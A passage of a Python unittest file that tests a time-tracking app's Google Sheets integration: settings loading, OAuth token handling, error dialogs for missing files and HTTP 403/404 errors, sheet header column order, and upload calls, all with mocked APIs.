"""
Tests for Google Sheets Integration

Verifies Google Sheets API configuration, authentication, and data upload.
"""

import unittest
from unittest.mock import Mock, patch, MagicMock, mock_open
import json
import os
import sys
import pickle

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from test_helpers import TestDataGenerator, TestFileManager

# Check if Google Sheets module can be imported
# This must be done before @patch decorators are evaluated
GOOGLE_SHEETS_AVAILABLE = False
try:
    from src import google_sheets_integration

    GOOGLE_SHEETS_AVAILABLE = True
except (ImportError, ModuleNotFoundError):
    pass


@unittest.skipIf(
    not GOOGLE_SHEETS_AVAILABLE, "Google Sheets dependencies not installed"
)
class TestGoogleSheetsIntegration(unittest.TestCase):
    """Test Google Sheets integration functionality"""

    def setUp(self):
        """Set up test fixtures"""
        self.file_manager = TestFileManager()
        self.addCleanup(self.file_manager.cleanup)  # Ensures cleanup even if test fails

        # Create settings with Google Sheets config
        settings = TestDataGenerator.create_settings_data()
        settings["google_sheets"] = {
            "enabled": True,
            "spreadsheet_id": "test_spreadsheet_123",
            "sheet_name": "Sessions",
            "credentials_file": "credentials.json",
        }

        self.test_settings_file = self.file_manager.create_test_file(
            "test_google_settings.json", settings
        )

    def tearDown(self):
        """Clean up test files"""
        self.file_manager.cleanup()

    def test_google_sheets_settings_structure(self):
        """Test that Google Sheets settings have correct structure"""
        with open(self.test_settings_file, "r") as f:
            settings = json.load(f)

        self.assertIn("google_sheets", settings)

        google_settings = settings["google_sheets"]
        self.assertIn("enabled", google_settings)
        self.assertIn("spreadsheet_id", google_settings)
        self.assertIn("sheet_name", google_settings)
        self.assertIn("credentials_file", google_settings)

    def test_google_sheets_can_be_disabled(self):
        """Test that Google Sheets can be disabled"""
        with open(self.test_settings_file, "r") as f:
            settings = json.load(f)

        # Disable Google Sheets
        settings["google_sheets"]["enabled"] = False

        with open(self.test_settings_file, "w") as f:
            json.dump(settings, f)

        # Reload and verify
        with open(self.test_settings_file, "r") as f:
            reloaded = json.load(f)

        self.assertFalse(reloaded["google_sheets"]["enabled"])

    @patch("src.google_sheets_integration.messagebox.showerror")
    def test_load_settings_with_missing_file(self, mock_error):
        """Test that missing settings file doesn't show error dialog (silent fallback)"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            # Use a file path that doesn't exist
            uploader = GoogleSheetsUploader("nonexistent_file.json")

            # Should return empty dict, no error dialog
            self.assertEqual(uploader.settings, {})
            mock_error.assert_not_called()
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    def test_load_settings_with_invalid_json(self, mock_error):
        """Test that invalid JSON triggers error dialog"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            # Create file with invalid JSON (empty file)
            invalid_file = self.file_manager.create_test_file("invalid_json.json", "")

            uploader = GoogleSheetsUploader(invalid_file)

            # Should show error dialog for JSONDecodeError
            mock_error.assert_called_once()
            call_args = mock_error.call_args[0]
            self.assertEqual(call_args[0], "Settings Error")
            self.assertIn("Invalid JSON", call_args[1])
            self.assertIn(invalid_file, call_args[1])

            # Should still return empty dict as fallback
            self.assertEqual(uploader.settings, {})
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    def test_load_settings_with_malformed_json(self, mock_error):
        """Test that malformed JSON triggers error dialog"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            # Create file with malformed JSON
            malformed_file = self.file_manager.create_test_file(
                "malformed.json", '{"key": invalid}'
            )

            uploader = GoogleSheetsUploader(malformed_file)

            # Should show error dialog
            mock_error.assert_called_once()
            call_args = mock_error.call_args[0]
            self.assertIn("Invalid JSON", call_args[1])

            # Should return empty dict as fallback
            self.assertEqual(uploader.settings, {})
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    @patch("builtins.open", side_effect=PermissionError("Access denied"))
    def test_load_settings_with_permission_error(self, mock_open, mock_error):
        """Test that permission errors trigger error dialog"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            uploader = GoogleSheetsUploader("protected_file.json")

            # Should show error dialog for PermissionError
            mock_error.assert_called_once()
            call_args = mock_error.call_args[0]
            self.assertEqual(call_args[0], "Settings Error")
            self.assertIn("Permission denied", call_args[1])

            # Should return empty dict as fallback
            self.assertEqual(uploader.settings, {})
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    @patch("builtins.open", side_effect=OSError("Disk error"))
    def test_load_settings_with_unexpected_error(self, mock_open, mock_error):
        """Test that unexpected errors trigger error dialog"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            uploader = GoogleSheetsUploader("problem_file.json")

            # Should show error dialog for unexpected Exception
            mock_error.assert_called_once()
            call_args = mock_error.call_args[0]
            self.assertEqual(call_args[0], "Settings Error")
            self.assertIn("Unexpected error", call_args[1])
            self.assertIn("OSError", call_args[1])

            # Should return empty dict as fallback
            self.assertEqual(uploader.settings, {})
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    @patch("src.google_sheets_integration.os.path.exists")
    @patch("src.google_sheets_integration.build")
    def test_uploader_initialization(self, mock_build, mock_exists, mock_error):
        """Test GoogleSheetsUploader initialization"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            uploader = GoogleSheetsUploader(self.test_settings_file)

            # Verify settings loaded
            self.assertIsNotNone(uploader.settings)
            self.assertEqual(uploader.settings_file, self.test_settings_file)
            # No error dialog should be shown for valid settings
            mock_error.assert_not_called()
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    @patch("src.google_sheets_integration.os.path.exists")
    def test_is_enabled_check(self, mock_exists, mock_error):
        """Test checking if Google Sheets upload is enabled"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            uploader = GoogleSheetsUploader(self.test_settings_file)
            self.assertTrue(uploader.is_enabled())

            # Test with disabled settings
            disabled_settings = TestDataGenerator.create_settings_data()
            disabled_settings["google_sheets"] = {"enabled": False}

            disabled_file = self.file_manager.create_test_file(
                "test_disabled_google.json", disabled_settings
            )

            uploader2 = GoogleSheetsUploader(disabled_file)
            self.assertFalse(uploader2.is_enabled())
            # No error dialogs for valid settings
            mock_error.assert_not_called()
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    @patch("src.google_sheets_integration.os.path.exists")
    def test_get_spreadsheet_id(self, mock_exists, mock_error):
        """Test retrieving spreadsheet ID from settings"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            uploader = GoogleSheetsUploader(self.test_settings_file)
            spreadsheet_id = uploader.get_spreadsheet_id()

            self.assertEqual(spreadsheet_id, "test_spreadsheet_123")
            mock_error.assert_not_called()
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    @patch("src.google_sheets_integration.os.path.exists")
    def test_get_sheet_name(self, mock_exists, mock_error):
        """Test retrieving sheet name from settings"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            uploader = GoogleSheetsUploader(self.test_settings_file)
            sheet_name = uploader.get_sheet_name()

            self.assertEqual(sheet_name, "Sessions")
            mock_error.assert_not_called()
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    @patch("src.google_sheets_integration.build")
    @patch("src.google_sheets_integration.pickle.load")
    @patch("src.google_sheets_integration.os.path.exists", return_value=True)
    def test_authenticate_with_existing_token(
        self, mock_exists, mock_pickle_load, mock_build, mock_error
    ):
        """Test authentication when valid token exists"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            # Mock existing valid credentials
            mock_creds = Mock()
            mock_creds.valid = True
            mock_creds.expired = False
            mock_pickle_load.return_value = mock_creds

            # Mock service build
            mock_service = Mock()
            mock_build.return_value = mock_service

            # Create uploader before patching open (so settings are loaded normally)
            uploader = GoogleSheetsUploader(self.test_settings_file)

            # Now mock open only for the token file operation
            with patch("builtins.open", mock_open()):
                result = uploader.authenticate()

                self.assertTrue(result)
                self.assertIsNotNone(uploader.credentials)
                self.assertIsNotNone(uploader.service)
                mock_error.assert_not_called()
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    @patch("src.google_sheets_integration.os.path.exists")
    def test_authentication_fails_without_credentials_file(
        self, mock_exists, mock_error
    ):
        """Test that authentication fails and shows error when credentials file missing"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            # Mock that no token or credentials exist
            mock_exists.return_value = False

            uploader = GoogleSheetsUploader(self.test_settings_file)
            result = uploader.authenticate()

            # Should now show error dialog for missing credentials
            mock_error.assert_called_once()
            call_args = mock_error.call_args[0]
            self.assertIn("Credentials file not found", call_args[1])
            self.assertFalse(result)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showwarning")
    @patch("src.google_sheets_integration.messagebox.showerror")
    @patch("src.google_sheets_integration.os.path.exists", return_value=True)
    @patch("builtins.open", side_effect=PermissionError("Access denied"))
    def test_authenticate_token_permission_error(
        self, mock_open, mock_exists, mock_error, mock_warning
    ):
        """Test that permission errors on token file show warning"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            uploader = GoogleSheetsUploader(self.test_settings_file)
            result = uploader.authenticate()

            # Should show warning for permission error
            mock_warning.assert_called_once()
            call_args = mock_warning.call_args[0]
            self.assertIn("Permission denied", call_args[1])
            self.assertIn("token", call_args[1].lower())

            # Should attempt to continue (returns False since no credentials_file)
            self.assertFalse(result)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showwarning")
    @patch("src.google_sheets_integration.messagebox.showerror")
    @patch(
        "src.google_sheets_integration.pickle.load",
        side_effect=pickle.UnpicklingError("Corrupted"),
    )
    def test_authenticate_corrupted_token_silent(
        self, mock_pickle_load, mock_error, mock_warning
    ):
        """Test that corrupted token file doesn't show warning (auto-recovers)"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            uploader = GoogleSheetsUploader(self.test_settings_file)

            # Mock exists: token exists (corrupted), credentials missing
            def exists_side_effect(path):
                if "token.pickle" in path:
                    return True  # Token exists but corrupted
                return False  # credentials.json missing

            with patch(
                "src.google_sheets_integration.os.path.exists",
                side_effect=exists_side_effect,
            ):
                with patch("builtins.open", mock_open()):
                    result = uploader.authenticate()

            # Should NOT show warning for corrupted token (auto-recovers)
            mock_warning.assert_not_called()

            # Will show error for missing credentials file (expected)
            mock_error.assert_called_once()
            call_args = mock_error.call_args[0]
            self.assertIn("Credentials file not found", call_args[1])

            # Will fail because no credentials file after token corruption
            self.assertFalse(result)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    def test_session_data_format_for_upload(self):
        """Test that session data can be formatted for Google Sheets"""
        session_data = TestDataGenerator.create_session_data()
        session = list(session_data.values())[0]

        # Verify session has fields needed for Google Sheets
        self.assertIn("sphere", session)
        self.assertIn("date", session)
        self.assertIn("start_time", session)
        self.assertIn("end_time", session)
        self.assertIn("active_duration", session)
        self.assertIn("break_duration", session)
        self.assertIn("total_duration", session)

        # Verify active periods have project info (added during completion)
        if session["active"]:
            # In real usage, projects are added during completion
            # Here we just verify the structure is ready
            self.assertIsInstance(session["active"], list)

    @patch.dict(os.environ, {}, clear=False)
    @patch("src.google_sheets_integration.os.path.exists")
    def test_spreadsheet_id_required(self, mock_exists):
        """Test that spreadsheet ID is required for upload"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            # Clear any Google Sheets env vars that might interfere
            os.environ.pop("GOOGLE_SHEETS_SPREADSHEET_ID", None)
            os.environ.pop("GOOGLE_SHEETS_CREDENTIALS_FILE", None)
            os.environ.pop("GOOGLE_SHEETS_TOKEN_FILE", None)

            # Create settings without spreadsheet ID
            no_id_settings = TestDataGenerator.create_settings_data()
            no_id_settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "",  # Empty ID
                "sheet_name": "Sessions",
            }

            no_id_file = self.file_manager.create_test_file(
                "test_no_spreadsheet_id.json", no_id_settings
            )

            uploader = GoogleSheetsUploader(no_id_file)
            spreadsheet_id = uploader.get_spreadsheet_id()

            # Should return empty string
            self.assertEqual(spreadsheet_id, "")

            # Upload should not proceed without ID
            self.assertTrue(uploader.is_enabled())  # Enabled
            self.assertEqual(len(spreadsheet_id), 0)  # But no ID
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    def test_default_sheet_name(self):
        """Test default sheet name when not specified"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            # Create settings without sheet_name
            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "test_123",
                # No sheet_name specified
            }

            test_file = self.file_manager.create_test_file(
                "test_default_sheet.json", settings
            )

            uploader = GoogleSheetsUploader(test_file)
            sheet_name = uploader.get_sheet_name()

            # Should default to "Sessions"
            self.assertEqual(sheet_name, "Sessions")
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    @patch("src.google_sheets_integration.os.path.exists", return_value=False)
    def test_authenticate_missing_credentials_file_shows_error(
        self, mock_exists, mock_error
    ):
        """Test that missing credentials file shows error dialog with Google Cloud Console link"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            uploader = GoogleSheetsUploader(self.test_settings_file)
            result = uploader.authenticate()

            # Should show error dialog ONCE
            mock_error.assert_called_once()

            # Verify error message content
            call_args = mock_error.call_args[0]
            self.assertEqual(call_args[0], "Google Sheets Authentication")
            self.assertIn("Credentials file not found", call_args[1])
            self.assertIn("credentials.json", call_args[1])
            self.assertIn(
                "https://console.cloud.google.com/apis/credentials", call_args[1]
            )

            # Should return False
            self.assertFalse(result)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    @patch(
        "src.google_sheets_integration.InstalledAppFlow.from_client_secrets_file",
        side_effect=ValueError("client_secret is missing"),
    )
    def test_authenticate_invalid_credentials_format_shows_error(
        self, mock_flow, mock_error
    ):
        """Test that invalid credentials.json format shows error dialog with re-download instructions"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            uploader = GoogleSheetsUploader(self.test_settings_file)

            # Mock os.path.exists to return True for credentials file, False for token
            def exists_side_effect(path):
                if "credentials.json" in path:
                    return True
                return False  # token.pickle doesn't exist

            with patch(
                "src.google_sheets_integration.os.path.exists",
                side_effect=exists_side_effect,
            ):
                result = uploader.authenticate()

            # Should show error dialog ONCE
            mock_error.assert_called_once()

            # Verify error message content
            call_args = mock_error.call_args[0]
            self.assertEqual(call_args[0], "Google Sheets Authentication")
            self.assertIn("Invalid credentials file format", call_args[1])
            self.assertIn("credentials.json", call_args[1])
            self.assertIn("client_secret is missing", call_args[1])
            self.assertIn("Re-download credentials.json", call_args[1])
            self.assertIn("Google Cloud Console", call_args[1])

            # Should return False
            self.assertFalse(result)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    @patch(
        "src.google_sheets_integration.InstalledAppFlow.from_client_secrets_file",
        side_effect=Exception("Network timeout"),
    )
    def test_authenticate_oauth_flow_failure_shows_helpful_error(
        self, mock_flow, mock_error
    ):
        """Test that OAuth flow failures show error dialog with actionable troubleshooting steps"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            uploader = GoogleSheetsUploader(self.test_settings_file)

            # Mock os.path.exists to return True for credentials file, False for token
            def exists_side_effect(path):
                if "credentials.json" in path:
                    return True
                return False  # token.pickle doesn't exist

            with patch(
                "src.google_sheets_integration.os.path.exists",
                side_effect=exists_side_effect,
            ):
                result = uploader.authenticate()

            # Should show error dialog ONCE
            mock_error.assert_called_once()

            # Verify error message content with troubleshooting steps
            call_args = mock_error.call_args[0]
            self.assertEqual(call_args[0], "Google Sheets Authentication")
            self.assertIn("Authentication failed", call_args[1])
            self.assertIn("Network timeout", call_args[1])
            self.assertIn("Possible fixes", call_args[1])
            self.assertIn("internet connection", call_args[1])
            self.assertIn("browser authentication", call_args[1])
            self.assertIn("credentials.json is valid", call_args[1])
            self.assertIn("Try again", call_args[1])

            # Should return False
            self.assertFalse(result)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    @patch(
        "src.google_sheets_integration.build",
        side_effect=Exception("API connection failed"),
    )
    @patch("src.google_sheets_integration.pickle.load")
    @patch("src.google_sheets_integration.os.path.exists", return_value=True)
    def test_authenticate_api_build_failure_shows_connection_error(
        self, mock_exists, mock_pickle_load, mock_build, mock_error
    ):
        """Test that Google Sheets API connection failures show error dialog"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            # Mock valid credentials
            mock_creds = Mock()
            mock_creds.valid = True
            mock_creds.expired = False
            mock_pickle_load.return_value = mock_creds

            uploader = GoogleSheetsUploader(self.test_settings_file)

            with patch("builtins.open", mock_open()):
                result = uploader.authenticate()

            # Should show error dialog ONCE
            mock_error.assert_called_once()

            # Verify error message content
            call_args = mock_error.call_args[0]
            self.assertEqual(call_args[0], "Google Sheets Connection")
            self.assertIn("Failed to connect to Google Sheets API", call_args[1])
            self.assertIn("API connection failed", call_args[1])
            self.assertIn("internet connection", call_args[1])

            # Should return False
            self.assertFalse(result)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    @patch("src.google_sheets_integration.build")
    @patch("src.google_sheets_integration.pickle.load")
    @patch("src.google_sheets_integration.os.path.exists", return_value=True)
    def test_authenticate_successful_no_error_dialogs(
        self, mock_exists, mock_pickle_load, mock_build, mock_error
    ):
        """Test that successful authentication shows NO error dialogs"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            # Mock valid credentials
            mock_creds = Mock()
            mock_creds.valid = True
            mock_creds.expired = False
            mock_pickle_load.return_value = mock_creds

            # Mock service build success
            mock_service = Mock()
            mock_build.return_value = mock_service

            uploader = GoogleSheetsUploader(self.test_settings_file)

            with patch("builtins.open", mock_open()):
                result = uploader.authenticate()

            # Should NOT show any error dialogs
            mock_error.assert_not_called()

            # Should return True
            self.assertTrue(result)
            self.assertIsNotNone(uploader.service)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    def test_ensure_headers_permission_denied_shows_error(self, mock_error):
        """Test that 403 permission error when accessing spreadsheet shows helpful error"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader
            from googleapiclient.errors import HttpError

            uploader = GoogleSheetsUploader(self.test_settings_file)

            # Mock service that raises 403 permission error
            mock_service = Mock()
            mock_resp = Mock()
            mock_resp.status = 403
            http_error = HttpError(mock_resp, b"Permission denied")

            mock_service.spreadsheets().values().get().execute.side_effect = http_error
            uploader.service = mock_service

            result = uploader._ensure_sheet_headers()

            # Should show error dialog ONCE
            mock_error.assert_called_once()
            call_args = mock_error.call_args[0]
            self.assertEqual(call_args[0], "Google Sheets Permission Error")
            self.assertIn("Permission denied accessing spreadsheet", call_args[1])
            self.assertIn("access to the spreadsheet", call_args[1])

            # Should return False
            self.assertFalse(result)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    def test_ensure_headers_spreadsheet_not_found_shows_error(self, mock_error):
        """Test that 404 error shows spreadsheet ID and helpful message"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader
            from googleapiclient.errors import HttpError

            uploader = GoogleSheetsUploader(self.test_settings_file)

            # Mock service that raises 404 not found error
            mock_service = Mock()
            mock_resp = Mock()
            mock_resp.status = 404
            http_error = HttpError(mock_resp, b"Not found")

            mock_service.spreadsheets().values().get().execute.side_effect = http_error
            uploader.service = mock_service

            result = uploader._ensure_sheet_headers()

            # Should show error dialog ONCE with spreadsheet ID
            mock_error.assert_called_once()
            call_args = mock_error.call_args[0]
            self.assertEqual(call_args[0], "Google Sheets Error")
            self.assertIn("Spreadsheet not found", call_args[1])
            self.assertIn("test_spreadsheet_123", call_args[1])  # From settings
            self.assertIn("Check the spreadsheet ID", call_args[1])

            # Should return False
            self.assertFalse(result)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    def test_create_sheet_permission_denied_shows_error(self, mock_error):
        """Test that 403 error when creating sheet shows specific error"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader
            from googleapiclient.errors import HttpError

            uploader = GoogleSheetsUploader(self.test_settings_file)

            # Mock service that raises 400 (sheet doesn't exist), then 403 on create
            mock_service = Mock()
            mock_resp_400 = Mock()
            mock_resp_400.status = 400
            http_error_400 = HttpError(mock_resp_400, b"Sheet not found")

            mock_resp_403 = Mock()
            mock_resp_403.status = 403
            http_error_403 = HttpError(mock_resp_403, b"Permission denied")

            # First call raises 400, create_sheet raises 403
            mock_service.spreadsheets().values().get().execute.side_effect = (
                http_error_400
            )
            mock_service.spreadsheets().batchUpdate().execute.side_effect = (
                http_error_403
            )
            uploader.service = mock_service

            result = uploader._ensure_sheet_headers()

            # Should show error dialog ONCE about creating sheet
            mock_error.assert_called_once()
            call_args = mock_error.call_args[0]
            self.assertEqual(call_args[0], "Google Sheets Permission Error")
            self.assertIn("Permission denied creating sheet", call_args[1])
            self.assertIn("Sessions", call_args[1])  # Sheet name
            self.assertIn("edit access", call_args[1])
            self.assertIn("Editor permissions", call_args[1])

            # Should return False
            self.assertFalse(result)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    def test_ensure_headers_creates_sheet_if_needed(self, mock_error):
        """Test that missing sheet gets created automatically (no error dialog)"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader
            from googleapiclient.errors import HttpError

            uploader = GoogleSheetsUploader(self.test_settings_file)

            # Mock service that raises 400 on first call, succeeds on retry
            mock_service = Mock()
            mock_resp_400 = Mock()
            mock_resp_400.status = 400
            http_error_400 = HttpError(mock_resp_400, b"Sheet not found")

            # First get() raises 400, create succeeds, second get() returns empty headers
            mock_service.spreadsheets().values().get().execute.side_effect = [
                http_error_400,  # First call - sheet doesn't exist
                {"values": []},  # After creation - no headers yet
            ]
            mock_service.spreadsheets().batchUpdate().execute.return_value = {}
            mock_service.spreadsheets().values().update().execute.return_value = {}
            uploader.service = mock_service

            result = uploader._ensure_sheet_headers()

            # Should NOT show error dialog (automatic recovery)
            mock_error.assert_not_called()

            # Should return True (created successfully)
            self.assertTrue(result)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    def test_create_sheet_unexpected_error_shows_message(self, mock_error):
        """Test that unexpected error during sheet creation shows helpful error"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            uploader = GoogleSheetsUploader(self.test_settings_file)

            # Mock service that raises an unexpected error (not HttpError)
            mock_service = Mock()
            mock_service.spreadsheets().batchUpdate().execute.side_effect = Exception(
                "Unexpected network error"
            )
            uploader.service = mock_service

            result = uploader._create_sheet()

            # Should show error dialog ONCE
            mock_error.assert_called_once()
            call_args = mock_error.call_args[0]
            self.assertEqual(call_args[0], "Google Sheets Error")
            self.assertIn("Failed to create sheet", call_args[1])
            self.assertIn("Sessions", call_args[1])  # Sheet name
            self.assertIn("Unexpected network error", call_args[1])
            self.assertIn("Check your spreadsheet configuration", call_args[1])

            # Should return False
            self.assertFalse(result)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    def test_ensure_headers_validates_column_order(self, mock_error):
        """Test that header validation detects when columns are rearranged"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            uploader = GoogleSheetsUploader(self.test_settings_file)

            # Mock service with WRONG column order (Date and Sphere swapped)
            mock_service = Mock()
            mock_service.spreadsheets().values().get().execute.return_value = {
                "values": [
                    [
                        "Session ID",
                        "Sphere",  # WRONG - should be "Date"
                        "Date",  # WRONG - should be "Sphere"
                        "Session Start Time",
                        "Session End Time",
                    ]
                ]
            }
            uploader.service = mock_service

            result = uploader._ensure_sheet_headers()

            # Should show error dialog showing expected column order
            mock_error.assert_called_once()
            call_args = mock_error.call_args[0]
            self.assertEqual(call_args[0], "Google Sheets Column Order Error")
            self.assertIn("Column order has been changed", call_args[1])
            self.assertIn("Correct column order", call_args[1])
            # Check that it shows the complete numbered list
            self.assertIn("1. Session ID", call_args[1])
            self.assertIn("2. Date", call_args[1])
            self.assertIn("3. Sphere", call_args[1])
            self.assertIn("23. Session Notes", call_args[1])  # Last column

            # Should return False
            self.assertFalse(result)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    def test_ensure_headers_accepts_correct_column_order(self, mock_error):
        """Test that header validation passes when columns are in correct order"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            uploader = GoogleSheetsUploader(self.test_settings_file)

            # Mock service with CORRECT column order
            mock_service = Mock()
            mock_service.spreadsheets().values().get().execute.return_value = {
                "values": [
                    [
                        "Session ID",
                        "Date",
                        "Sphere",
                        "Session Start Time",
                        "Session End Time",
                        "Session Total Duration (min)",
                        "Session Active Duration (min)",
                        "Session Break Duration (min)",
                        "Type",
                        "Project",
                        "Project Comment",
                        "Secondary Project",
                        "Secondary Comment",
                        "Secondary Percentage",
                        "Activity Start",
                        "Activity End",
                        "Activity Duration (min)",
                        "Break Action",
                        "Secondary Action",
                        "Active Notes",
                        "Break Notes",
                        "Idle Notes",
                        "Session Notes",
                    ]
                ]
            }
            uploader.service = mock_service

            result = uploader._ensure_sheet_headers()

            # Should NOT show error dialog
            mock_error.assert_not_called()

            # Should return True
            self.assertTrue(result)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")


@unittest.skipIf(
    not GOOGLE_SHEETS_AVAILABLE, "Google Sheets dependencies not installed"
)
class TestGoogleSheetsUploadFlow(unittest.TestCase):
    """Test complete upload flow from completion to Google Sheets"""

    def setUp(self):
        """Set up test fixtures"""
        self.file_manager = TestFileManager()

    def tearDown(self):
        """Clean up test files"""
        self.file_manager.cleanup()

    def test_upload_method_exists(self):
        """Test that completion frame has upload method"""
        try:
            from src.completion_frame import CompletionFrame

            # Verify the upload method exists
            self.assertTrue(hasattr(CompletionFrame, "_upload_to_google_sheets"))
        except ImportError as e:
            self.skipTest(f"Completion frame not available: {e}")

    @patch("src.google_sheets_integration.GoogleSheetsUploader")
    def test_upload_to_google_sheets_calls_uploader(self, mock_uploader_class):
        """Test that _upload_to_google_sheets actually calls the uploader"""
        try:
            from src.completion_frame import CompletionFrame

            # Create mock uploader instance
            mock_uploader = Mock()
            mock_uploader.is_enabled.return_value = True
            mock_uploader.upload_session.return_value = True
            mock_uploader_class.return_value = mock_uploader

            # Create a mock completion frame instance with minimal setup
            frame = Mock(spec=CompletionFrame)
            frame.tracker = Mock()
            frame.tracker.settings_file = "test_settings.json"
            frame.session_name = "test_session_123"

            # Create test session data
            session_data = {
                "sphere": "Work",
                "project": "Testing",
                "date": "2024-01-20",
                "start_time": "10:00:00",
                "end_time": "10:30:00",
                "total_duration": 1800,
            }

            # Call the real method on our mock frame
            CompletionFrame._upload_to_google_sheets(frame, session_data)

            # Verify GoogleSheetsUploader was instantiated with correct settings file
            mock_uploader_class.assert_called_once_with("test_settings.json")

            # Verify is_enabled was called
            mock_uploader.is_enabled.assert_called_once()

            # Verify upload_session was called with correct parameters
            mock_uploader.upload_session.assert_called_once_with(
                session_data, "test_session_123"
            )

        except ImportError as e:
            self.skipTest(f"Completion frame not available: {e}")

    @patch("src.google_sheets_integration.GoogleSheetsUploader")
    def test_upload_skipped_when_disabled(self, mock_uploader_class):
        """Test that upload is skipped when Google Sheets is disabled"""
        try:
            from src.completion_frame import CompletionFrame

            # Create mock uploader that is disabled
            mock_uploader = Mock()
            mock_uploader.is_enabled.return_value = False
            mock_uploader_class.return_value = mock_uploader

            # Create a mock completion frame instance
            frame = Mock(spec=CompletionFrame)
            frame.tracker = Mock()
            frame.tracker.settings_file = "test_settings.json"
            frame.session_name = "test_session_123"

            # Create test session data
            session_data = {"sphere": "Work", "project": "Testing"}

            # Call the real method on our mock frame
            CompletionFrame._upload_to_google_sheets(frame, session_data)

            # Verify is_enabled was called
            mock_uploader.is_enabled.assert_called_once()

            # Verify upload_session was NOT called since disabled
            mock_uploader.upload_session.assert_not_called()

        except ImportError as e:
            self.skipTest(f"Completion frame not available: {e}")

    @patch("src.google_sheets_integration.build")
    @patch("src.google_sheets_integration.os.path.exists")
    def test_upload_session_formats_data_correctly(self, mock_exists, mock_build):
        """Test that upload_session sends correctly formatted data to Google API"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            # Mock the Google Sheets service
            mock_service = Mock()
            mock_spreadsheets = Mock()
            mock_values = Mock()
            mock_append = Mock()

            # Setup the mock chain: service.spreadsheets().values().append()
            mock_service.spreadsheets.return_value = mock_spreadsheets
            mock_spreadsheets.values.return_value = mock_values
            mock_values.append.return_value = mock_append
            mock_append.execute.return_value = {"updates": {"updatedCells": 23}}

            mock_build.return_value = mock_service
            mock_exists.return_value = True

            # Create uploader
            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "test_spreadsheet_123",
                "sheet_name": "Sessions",
            }

            test_file = self.file_manager.create_test_file(
                "test_api_format.json", settings
            )

